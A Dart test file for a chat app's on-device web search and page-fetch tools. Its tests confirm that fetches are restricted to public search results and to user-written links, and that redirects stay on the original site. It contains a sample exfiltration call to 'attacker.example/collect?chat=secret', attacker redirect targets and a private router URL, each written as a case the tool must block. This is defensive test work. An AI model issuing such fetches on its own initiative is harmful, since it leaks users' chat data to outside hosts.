import 'package:conduit_core/features/direct_connections/models/direct_completion.dart';
import 'package:conduit_core/features/direct_connections/services/direct_chat_bridge.dart';
import 'package:conduit_core/features/web_search/models/web_search_preferences.dart';
import 'package:conduit_core/features/web_search/services/on_device_web_tools.dart';
import 'package:conduit_core/features/web_search/services/web_page_fetcher.dart';
import 'package:conduit_core/models/chat_message.dart';
import 'package:conduit_ddgs/conduit_ddgs.dart';
import 'package:http/http.dart' as http;
import 'package:http/testing.dart';
import 'package:test/test.dart';

/// An engine that answers every query with fixed results.
final class _StubEngine extends SearchEngine {
  _StubEngine(this.results);

  final List<(String, String)> results;

  @override
  SearchEngineId get id => SearchEngineId.duckduckgo;

  @override
  SearchEngineRequest buildRequest(SearchQuery query) =>
      SearchEngineRequest.get(Uri.https('html.duckduckgo.com', '/html/'));

  @override
  List<WebSearchResult> parse(String body, SearchQuery query) => [
    for (final (title, url) in results)
      WebSearchResult(
        title: title,
        url: Uri.parse(url),
        snippet: '$title snippet',
        engine: id,
      ),
  ];
}

final class _RecordingFetcher extends WebPageFetcher {
  final List<Uri> fetched = [];
  final List<RedirectPolicy?> redirectPolicies = [];

  @override
  Future<FetchedWebPage> fetch(
    Uri url, {
    String? acceptLanguage,
    Future<void>? cancel,
    RedirectPolicy? allowRedirect,
  }) async {
    fetched.add(url);
    redirectPolicies.add(allowRedirect);
    return FetchedWebPage(
      url: url,
      contentType: 'text/html',
      body:
          '<html><head><title>Page</title></head><body><article>'
          '<p>${'Readable text. ' * 400}</p></article></body></html>',
      truncated: false,
    );
  }
}

Ddgs _ddgs(List<(String, String)> results, {int status = 200}) => Ddgs(
  client: MockClient((_) async => http.Response('', status)),
  engines: {SearchEngineId.duckduckgo: _StubEngine(results)},
);

OnDeviceWebToolSession _session({
  required Ddgs search,
  required WebPageFetcher fetcher,
  WebToolBudget budget = WebToolBudget.standard,
  Iterable<String> userProvidedUrls = const [],
}) => OnDeviceWebToolSession(
  search: search,
  fetcher: fetcher,
  engine: WebSearchEngineChoice.duckduckgo,
  region: SearchRegion.worldwide,
  safeSearch: SafeSearch.moderate,
  budget: budget,
  userProvidedUrls: userProvidedUrls,
);

void main() {
  test('search results become chat sources, and only public ones are '
      'fetchable', () async {
    final fetcher = _RecordingFetcher();
    final session = _session(
      search: _ddgs([
        ('Dart', 'https://dart.dev/'),
        ('Router admin', 'http://192.168.1.1/admin'),
      ]),
      fetcher: fetcher,
      budget: WebToolBudget.compact,
    );

    final search = await session.execute(kWebSearchToolName, {'query': 'dart'});
    expect(search.isError, isFalse);

    // The structured value is what the adapters hand the chat bridge.
    final accumulator = DirectStreamingAccumulator()
      ..apply(
        DirectToolCallCompleted(
          id: 'call-1',
          name: kWebSearchToolName,
          arguments: const {'query': 'dart'},
          result: search.value,
        ),
      );
    expect(accumulator.sources, [
      const ChatSourceReference(
        title: 'Dart',
        url: 'https://dart.dev/',
        snippet: 'Dart snippet',
        type: 'web',
      ),
    ]);

    final page = await session.execute(kWebFetchToolName, {
      'url': 'https://dart.dev/',
    });
    expect(page.isError, isFalse);
    expect(fetcher.fetched, [Uri.parse('https://dart.dev/')]);
    final content = (page.value! as Map)['content'] as String;
    expect(content.length, lessThanOrEqualTo(1500));
    expect((page.value! as Map)['truncated'], isTrue);

    final private = await session.execute(kWebFetchToolName, {
      'url': 'http://192.168.1.1/admin',
    });
    expect(private.isError, isTrue);
    expect(fetcher.fetched, hasLength(1));
  });

  test('fetch is limited to search results and links the user wrote', () async {
    final fetcher = _RecordingFetcher();
    final session = _session(
      search: _ddgs(const []),
      fetcher: fetcher,
      userProvidedUrls: extractWebUrls(
        'Summarize https://docs.example.com/guide, please.',
      ),
    );

    final exfiltration = await session.execute(kWebFetchToolName, {
      'url': 'https://attacker.example/collect?chat=secret',
    });
    expect(exfiltration.isError, isTrue);
    expect(fetcher.fetched, isEmpty);

    final userLink = await session.execute(kWebFetchToolName, {
      'url': 'https://docs.example.com/guide',
    });
    expect(userLink.isError, isFalse);
    expect(fetcher.fetched, [Uri.parse('https://docs.example.com/guide')]);
    // The user chose this link, so it may redirect anywhere public.
    expect(fetcher.redirectPolicies.single, isNull);
  });

  test('a search result may only redirect within its own site', () async {
    final fetcher = _RecordingFetcher();
    final session = _session(
      search: _ddgs([('Dart', 'https://dart.dev/')]),
      fetcher: fetcher,
    );
    await session.execute(kWebSearchToolName, {'query': 'dart'});
    await session.execute(kWebFetchToolName, {'url': 'https://dart.dev/'});

    final allowRedirect = fetcher.redirectPolicies.single!;
    final from = Uri.parse('https://dart.dev/');
    for (final to in [
      'http://dart.dev/docs',
      'https://www.dart.dev/',
      'https://api.dart.dev/stable',
    ]) {
      expect(allowRedirect(from, Uri.parse(to)), isTrue, reason: to);
    }
    for (final to in [
      'https://attacker.example/?q=1',
      'https://notdart.dev/',
      'https://dart.dev.attacker.example/',
    ]) {
      expect(allowRedirect(from, Uri.parse(to)), isFalse, reason: to);
    }
  });

  test('a redirect never climbs to a shared parent domain', () {
    // Hops are judged against the original result, so victim.github.io
    // can't reach attacker.github.io by way of github.io.
    final origin = Uri.parse('https://victim.github.io/page');
    expect(
      isSameSiteRedirect(origin, Uri.parse('https://github.io/')),
      isFalse,
    );
    expect(
      isSameSiteRedirect(origin, Uri.parse('https://attacker.github.io/')),
      isFalse,
    );
    expect(
      isSameSiteRedirect(origin, Uri.parse('https://docs.victim.github.io/')),
      isTrue,
    );
  });

  test('links the user wrote are read as written', () {
    expect(
      extractWebUrls(
        'See HTTPS://Example.com/Doc, '
        'https://en.wikipedia.org/wiki/Dart_(programming_language). '
        '(also https://dart.dev/docs)',
      ),
      [
        'HTTPS://Example.com/Doc',
        'https://en.wikipedia.org/wiki/Dart_(programming_language)',
        'https://dart.dev/docs',
      ],
    );
  });

  test('a blocked engine becomes an error the model can read', () async {
    final session = _session(
      search: _ddgs(const [], status: 429),
      fetcher: _RecordingFetcher(),
    );

    final result = await session.execute(kWebSearchToolName, {'query': 'x'});
    expect(result.isError, isTrue);
    expect(result.text, contains('captcha'));
  });

  test('an empty answer after blocked engines is reported as unavailable, '
      'not as "no results"', () async {
    final session = OnDeviceWebToolSession(
      search: Ddgs(
        client: MockClient(
          (request) async => request.url.host == 'html.duckduckgo.com'
              ? http.Response('', 202)
              : http.Response('<html><body></body></html>', 200),
        ),
      ),
      fetcher: _RecordingFetcher(),
      engine: WebSearchEngineChoice.auto,
      region: SearchRegion.worldwide,
      safeSearch: SafeSearch.moderate,
    );

    final result = await session.execute(kWebSearchToolName, {'query': 'x'});
    expect(result.isError, isTrue);
    expect(result.text, contains('captcha'));
  });

  test('unexpected arguments are rejected without searching', () async {
    var requests = 0;
    final session = OnDeviceWebToolSession(
      search: Ddgs(
        client: MockClient((_) async {
          requests++;
          return http.Response('', 200);
        }),
      ),
      fetcher: _RecordingFetcher(),
      engine: WebSearchEngineChoice.auto,
      region: SearchRegion.worldwide,
      safeSearch: SafeSearch.moderate,
    );

    final result = await session.execute(kWebSearchToolName, {
      'query': 'x',
      'engine': 'google',
    });
    expect(result.isError, isTrue);
    expect(requests, 0);
  });
}
